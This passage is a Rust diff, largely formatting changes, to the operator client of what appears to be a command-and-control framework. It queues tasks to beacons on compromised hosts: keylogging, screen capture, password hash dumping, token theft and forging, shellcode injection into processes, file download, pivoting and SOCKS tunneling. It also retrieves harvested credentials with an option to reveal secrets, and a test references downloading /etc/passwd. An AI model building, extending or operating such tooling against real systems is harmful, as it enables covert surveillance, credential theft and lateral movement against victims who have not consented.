+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! keylog: {e}"), Level::Err),
                     }
                 }
-                Cmd::Screenwatch { session, interval_secs } => {
+                Cmd::Screenwatch {
+                    session,
+                    interval_secs,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "screenwatch", "interval_secs": interval_secs });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] screenwatch {interval_secs}s (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Screenshot, backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] screenwatch {interval_secs}s (task {})",
+                                    short(&session),
+                                    tid
+                                ),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Screenshot,
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! screenwatch: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! screenwatch: {e}"), Level::Err)
+                        }
                     }
                 }
                 Cmd::Hashdump { session, method } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "hashdump", "method": method });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] hashdump (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] hashdump (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}"), Level::Err),
                     }
                 }
                 Cmd::StealToken { session, pid } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "stealtoken", "pid": pid });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] steal_token({pid}) (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] steal_token({pid}) (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! steal_token: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! steal_token: {e}"), Level::Err)
+                        }
                     }
                 }
-                Cmd::MakeToken { session, domain, user, password, logon_type } => {
+                Cmd::MakeToken {
+                    session,
+                    domain,
+                    user,
+                    password,
+                    logon_type,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] make_token({domain}\\{user}) (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] make_token({domain}\\{user}) (task {})",
+                                    short(&session),
+                                    tid
+                                ),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! make_token: {e}"), Level::Err),
                     }
                 }
                 Cmd::Rev2Self { session } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "rev2self" });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] rev2self (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] rev2self (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! rev2self: {e}"), Level::Err),
                     }
                 }
                 Cmd::GetUid { session } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "getuid" });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] getuid (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] getuid (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}"), Level::Err),
                     }
                 }
-                Cmd::Inject { session, method, pid, spawn_to, sc_hex } => {
+                Cmd::Inject {
+                    session,
+                    method,
+                    pid,
+                    spawn_to,
+                    sc_hex,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({
                         "type": "inject",
@@ -798,15 +1229,35 @@ Cmd::Download { session, path, local } => {
                     });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] inject method={} pid={} (task {})", short(&session), method, pid, tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] inject method={} pid={} (task {})",
+                                    short(&session),
+                                    method,
+                                    pid,
+                                    tid
+                                ),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! inject: {e}"), Level::Err),
                     }
                 }
                 Cmd::FetchCreds { reveal } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let url = if reveal {
                         format!("{srv}/api/creds?reveal=1")
@@ -817,42 +1268,64 @@ Cmd::Download { session, path, local } => {
                         Ok(resp) => match resp.json::<Vec<ServerCred>>().await {
                             Ok(rows) => {
                                 let n = rows.len();
-                                log_push(&mut log_buf, &format!("server creds: {n} record(s)"), Level::Ok);
+                                log_push(
+                                    &mut log_buf,
+                                    &format!("server creds: {n} record(s)"),
+                                    Level::Ok,
+                                );
                                 // Adapt to the CredEntry overlay shape (principal = realm\user).
-                                let entries: Vec<CredEntry> = rows.into_iter().map(|c| {
-                                    let principal = if c.realm.is_empty() {
-                                        c.user.clone()
-                                    } else {
-                                        format!("{}\\{}", c.realm, c.user)
-                                    };
-CredEntry {
-        source: c.kind.clone(),
-        principal,
-        kind: match c.kind.as_str() {
-            "password" => CredKind::Password,
-            "ticket" => CredKind::Ticket,
-            "key" => CredKind::Key,
-            _ => CredKind::Hash,
-        },
-        secret: c.secret,
-    }
-                                }).collect();
+                                let entries: Vec<CredEntry> = rows
+                                    .into_iter()
+                                    .map(|c| {
+                                        let principal = if c.realm.is_empty() {
+                                            c.user.clone()
+                                        } else {
+                                            format!("{}\\{}", c.realm, c.user)
+                                        };
+                                        CredEntry {
+                                            source: c.kind.clone(),
+                                            principal,
+                                            kind: match c.kind.as_str() {
+                                                "password" => CredKind::Password,
+                                                "ticket" => CredKind::Ticket,
+                                                "key" => CredKind::Key,
+                                                _ => CredKind::Hash,
+                                            },
+                                            secret: c.secret,
+                                        }
+                                    })
+                                    .collect();
                                 parsed_buf = Some(ParsedTable::Creds(entries));
                             }
-                            Err(e) => log_push(&mut log_buf, &format!("! creds parse: {e}"), Level::Err),
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! creds parse: {e}"), Level::Err)
+                            }
                         },
-                        Err(e) => log_push(&mut log_buf, &format!("! creds fetch: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! creds fetch: {e}"), Level::Err)
+                        }
                     }
                 }
-                Cmd::FetchAudit { operator, action, limit } => {
+                Cmd::FetchAudit {
+                    operator,
+                    action,
+                    limit,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     // Build the query string from the optional filters.
                     let mut qs: Vec<String> = Vec::new();
-                    if let Some(op) = &operator { qs.push(format!("operator={op}")); }
-                    if let Some(ac) = &action { qs.push(format!("action={ac}")); }
-                    if let Some(l) = limit { qs.push(format!("limit={l}")); }
+                    if let Some(op) = &operator {
+                        qs.push(format!("operator={}", encode(op)));
+                    }
+                    if let Some(ac) = &action {
+                        qs.push(format!("action={}", encode(ac)));
+                    }
+                    if let Some(l) = limit {
+                        qs.push(format!("limit={l}"));
+                    }
                     let url = if qs.is_empty() {
                         format!("{srv}/api/audit")
                     } else {
@@ -865,28 +1338,37 @@ CredEntry {
                                 log_push(&mut log_buf, &format!("audit: {n} record(s)"), Level::Ok);
                                 parsed_buf = Some(ParsedTable::Audit(rows));
                             }
-                            Err(e) => log_push(&mut log_buf, &format!("! audit parse: {e}"), Level::Err),
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! audit parse: {e}"), Level::Err)
+                            }
                         },
-                        Err(e) => log_push(&mut log_buf, &format!("! audit fetch: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! audit fetch: {e}"), Level::Err)
+                        }
                     }
                 }
                 Cmd::FetchTasks { session } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
-                    let url = format!("{srv}/api/tasks?session={session}");
+                    let url = format!("{srv}/api/tasks?session={}", encode(&session));
                     match authed(client.get(&url), tok).send().await {
                         Ok(resp) => match resp.json::<Vec<TaskRow>>().await {
                             Ok(rows) => {
                                 let n = rows.len();
-                                log_push(&mut log_buf, &format!("tasks: {n} queued", ), Level::Ok);
+                                log_push(&mut log_buf, &format!("tasks: {n} queued",), Level::Ok);
                                 // parsed_buf is mandatory — without it the
                                 // overlay never opens (see the /profile bug).
                                 parsed_buf = Some(ParsedTable::Tasks(rows));
                             }
-                            Err(e) => log_push(&mut log_buf, &format!("! tasks parse: {e}"), Level::Err),
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! tasks parse: {e}"), Level::Err)
+                            }
                         },
-                        Err(e) => log_push(&mut log_buf, &format!("! tasks fetch: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! tasks fetch: {e}"), Level::Err)
+                        }
                     }
                 }
             }
@@ -938,21 +1420,35 @@ CredEntry {
             // Chunked tasks (downloads + screenshots) stream FileChunks + eof.
             let is_chunked = matches!(t.kind, TaskKind::Download { .. } | TaskKind::Screenshot);
             let is_image = matches!(t.kind, TaskKind::Screenshot);
-        if !is_chunked && t.started_at.elapsed() > TASK_DEADLINE {
+            if !is_chunked && t.started_at.elapsed() > TASK_DEADLINE {
                 log_push(
                     &mut log_buf,
-                    &format!("[{}] task {} timed out (>{:?}) — dropped",
-                             short(&t.session), t.task_id, TASK_DEADLINE),
+                    &format!(
+                        "[{}] task {} timed out (>{:?}) — dropped",
+                        short(&t.session),
+                        t.task_id,
+                        TASK_DEADLINE
+                    ),
                     Level::Warn,
                 );
                 continue;
             }
-// Chunked tasks need the full result stream, others a single row.
-let res = if is_chunked {
-    poll_file_chunks(&client, srv, &t.session, t.task_id, &mut t.chunks, is_image, &mut t.saw_eof, token).await
-} else {
-    poll_result(&client, srv, &t.session, t.task_id, token).await
-};
+            // Chunked tasks need the full result stream, others a single row.
+            let res = if is_chunked {
+                poll_file_chunks(
+                    &client,
+                    srv,
+                    &t.session,
+                    t.task_id,
+                    &mut t.chunks,
+                    is_image,
+                    &mut t.saw_eof,
+                    token,
+                )
+                .await
+            } else {
+                poll_result(&client, srv, &t.session, t.task_id, token).await
+            };
             match res {
                 PollOutcome::Done(out) => {
                     route_result(&mut log_buf, &mut parsed_buf, &t, out);
@@ -966,7 +1462,11 @@ let res = if is_chunked {
                     still_pending.push(t);
                 }
                 PollOutcome::Err(e) => {
-                    log_push(&mut log_buf, &format!("[{}] ! {}", short(&t.session), e), Level::Err);
+                    log_push(
+                        &mut log_buf,
+                        &format!("[{}] ! {}", short(&t.session), e),
+                        Level::Err,
+                    );
                 }
             }
         }
@@ -1000,35 +1500,41 @@ fn route_result(
     let out = match out {
         Some(o) => o,
         None => {
-            log_push(log_buf, &format!("[{}] (task {} no output)", short(&t.session), t.task_id), Level::Warn);
+            log_push(
+                log_buf,
+                &format!("[{}] (task {} no output)", short(&t.session), t.task_id),
+                Level::Warn,
+            );
             return;
         }
     };
     match &t.kind {
-        TaskKind::Shell(parse) => {
-            match parse {
-                ParseAs::None => {
-                    for line in out.lines() {
-                        log_push(log_buf, line, Level::Info);
-                    }
-                }
-                ParseAs::Files => {
-                    let rows = parse::parse_any_files(&out);
-                    *parsed_buf = Some(ParsedTable::Files(rows));
-                }
-                ParseAs::Procs => {
-                    let rows = parse::parse_any_procs(&out);
-                    *parsed_buf = Some(ParsedTable::Procs(rows));
-                }
-                ParseAs::Creds => {
-                    let rows = parse::parse_creds(&out);
-                    *parsed_buf = Some(ParsedTable::Creds(rows));
+        TaskKind::Shell(parse) => match parse {
+            ParseAs::None => {
+                for line in out.lines() {
+                    log_push(log_buf, line, Level::Info);
                 }
             }
-        }
+            ParseAs::Files => {
+                let rows = parse::parse_any_files(&out);
+                *parsed_buf = Some(ParsedTable::Files(rows));
+            }
+            ParseAs::Procs => {
+                let rows = parse::parse_any_procs(&out);
+                *parsed_buf = Some(ParsedTable::Procs(rows));
+            }
+            ParseAs::Creds => {
+                let rows = parse::parse_creds(&out);
+                *parsed_buf = Some(ParsedTable::Creds(rows));
+            }
+        },
         TaskKind::Bof { name } => {
             for line in out.lines() {
-                log_push(log_buf, &format!("[{}] bof {}: {}", short(&t.session), name, line), Level::Info);
+                log_push(
+                    log_buf,
+                    &format!("[{}] bof {}: {}", short(&t.session), name, line),
+                    Level::Info,
+                );
             }
         }
         TaskKind::Download { .. } | TaskKind::Screenshot => {
@@ -1038,15 +1544,27 @@ fn route_result(
             // An `ok` result surfaces here as the empty string; anything else is
             // treated as the beacon's response. Empty ⟺ alive.
             if out.trim().is_empty() {
-                log_push(log_buf, &format!("[{}] ping: alive", short(&t.session)), Level::Ok);
+                log_push(
+                    log_buf,
+                    &format!("[{}] ping: alive", short(&t.session)),
+                    Level::Ok,
+                );
             } else {
-                log_push(log_buf, &format!("[{}] ping: {}", short(&t.session), out.trim()), Level::Info);
+                log_push(
+                    log_buf,
+                    &format!("[{}] ping: {}", short(&t.session), out.trim()),
+                    Level::Info,
+                );
             }
         }
     }
 }
 
-fn finish_chunked(log_buf: &mut Vec<LogLine>, parsed_buf: &mut Option<ParsedTable>, t: &PendingTask) {
+fn finish_chunked(
+    log_buf: &mut Vec<LogLine>,
+    parsed_buf: &mut Option<ParsedTable>,
+    t: &PendingTask,
+) {
     // 重组分块数据
     let mut chunks = t.chunks.clone();
     chunks.sort_by_key(|(s, _)| *s);
@@ -1078,7 +1596,11 @@ fn finish_chunked(log_buf: &mut Vec<LogLine>, parsed_buf: &mut Option<ParsedTabl
         }
     }
     if let Err(e) = std::fs::write(&save_path, &out) {
-        log_push(log_buf, &format!("[{}] ! save {save_path}: {e}", short(&t.session)), Level::Err);
+        log_push(
+            log_buf,
+            &format!("[{}] ! save {save_path}: {e}", short(&t.session)),
+            Level::Err,
+        );
         return;
     }
     log_push(
@@ -1089,7 +1611,10 @@ fn finish_chunked(log_buf: &mut Vec<LogLine>, parsed_buf: &mut Option<ParsedTabl
     // 截图落盘后弹出 fullscreen 图片 overlay（path + bytes）。下载不弹 overlay
     // （文件在磁盘上，日志已指明路径）。
     if matches!(t.kind, TaskKind::Screenshot) {
-        *parsed_buf = Some(ParsedTable::Image { path: save_path, bytes: out.len() });
+        *parsed_buf = Some(ParsedTable::Image {
+            path: save_path,
+            bytes: out.len(),
+        });
     }
 }
 
@@ -1121,9 +1646,13 @@ async fn enqueue_shell(
     args: &str,
     token: &Option<String>,
 ) -> anyhow::Result<u64> {
-    let body = serde_json::json!({ "session": session, "command": { "type": "shell", "args": args } });
+    let body =
+        serde_json::json!({ "session": session, "command": { "type": "shell", "args": args } });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1146,7 +1675,10 @@ async fn enqueue_bof(
         "command": { "type": "bof", "name": name, "args": args_vec, "data_hex": data_hex }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1163,7 +1695,10 @@ async fn enqueue_upload(
         "command": { "type": "upload", "name": name, "data_hex": data_hex }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1178,7 +1713,10 @@ async fn enqueue_download(
         "session": session, "command": { "type": "download", "path": path }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1191,7 +1729,8 @@ async fn enqueue_exit(
 ) -> anyhow::Result<()> {
     let body = serde_json::json!({ "session": session, "command": { "type": "exit" } });
     let _ = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?;
+        .send()
+        .await?;
     Ok(())
 }
 
@@ -1209,7 +1748,10 @@ async fn enqueue_sleep(
         "command": { "type": "sleep", "seconds": seconds, "jitter_pct": jitter_pct }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1222,7 +1764,10 @@ async fn enqueue_ping(
 ) -> anyhow::Result<u64> {
     let body = serde_json::json!({ "session": session, "command": { "type": "ping" } });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1241,7 +1786,10 @@ async fn enqueue_fileop(
         "command": { "type": "fileop", "op": op, "path": path, "dest": dest }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1259,7 +1807,10 @@ async fn enqueue_pivot(
         "command": { "type": "connect", "host": host, "port": port }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok((ack.task_id, ack.chan))
 }
 
@@ -1280,7 +1831,10 @@ async fn enqueue_socks(
         "command": { "type": "socks", "chan": chan, "op": op, "addr": addr, "port": port }
     });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1294,7 +1848,10 @@ async fn enqueue_simple(
 ) -> anyhow::Result<u64> {
     let body = serde_json::json!({ "session": session, "command": command });
     let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
-        .send().await?.json().await?;
+        .send()
+        .await?
+        .json()
+        .await?;
     Ok(ack.task_id)
 }
 
@@ -1304,8 +1861,15 @@ async fn fetch_results(
     session: &str,
     token: &Option<String>,
 ) -> anyhow::Result<Vec<ResultView>> {
-    Ok(authed(c.get(format!("{server}/api/results")).query(&[("session", session)]), token)
-        .send().await?.json().await?)
+    Ok(authed(
+        c.get(format!("{server}/api/results"))
+            .query(&[("session", session)]),
+        token,
+    )
+    .send()
+    .await?
+    .json()
+    .await?)
 }
 
 /// Poll a single (non-file) task. Returns `Done(None)` if no matching result yet.
@@ -1339,7 +1903,7 @@ async fn poll_file_chunks(
     session: &str,
     task_id: u64,
     chunks: &mut Vec<(u32, Vec<u8>)>,
- is_image: bool,
+    is_image: bool,
     saw_eof: &mut bool,
     token: &Option<String>,
 ) -> PollOutcome {
@@ -1413,7 +1977,10 @@ fn session_signature(list: &[SessionView]) -> String {
 }
 
 fn log_push(buf: &mut Vec<LogLine>, text: &str, level: Level) {
-    buf.push(LogLine { text: text.to_string(), level });
+    buf.push(LogLine {
+        text: text.to_string(),
+        level,
+    });
     if buf.len() > LOG_BUFFER_CAP {
         let drop = buf.len() - LOG_BUFFER_CAP;
         buf.drain(..drop);
@@ -1436,8 +2003,15 @@ mod tests {
     #[test]
     fn signaturedetects_change() {
         let mk = |id: &str, pend: usize| SessionView {
-            id: id.into(), hostname: "h".into(), username: "u".into(), os: String::new(),
-            is_admin: 0, pending: pend, beacon_id: 0, arch: 0, pid: 0,
+            id: id.into(),
+            hostname: "h".into(),
+            username: "u".into(),
+            os: String::new(),
+            is_admin: 0,
+            pending: pend,
+            beacon_id: 0,
+            arch: 0,
+            pid: 0,
             ..Default::default()
         };
         let a = vec![mk("s1", 1)];
@@ -1451,7 +2025,13 @@ mod tests {
         let rows: Vec<TaskRow> = serde_json::from_str(json).unwrap();
         assert_eq!(rows.len(), 2);
         assert_eq!(rows[0].task_id, 7);
-        assert_eq!(rows[0].command.get("type").and_then(|v| v.as_str()), Some("shell"));
-        assert_eq!(rows[1].command.get("path").and_then(|v| v.as_str()), Some("/etc/passwd"));
+        assert_eq!(
+            rows[0].command.get("type").and_then(|v| v.as_str()),
+            Some("shell")
+        );
+        assert_eq!(
+            rows[1].command.get("path").and_then(|v| v.as_str()),
+            Some("/etc/passwd")
+        );
     }
 }
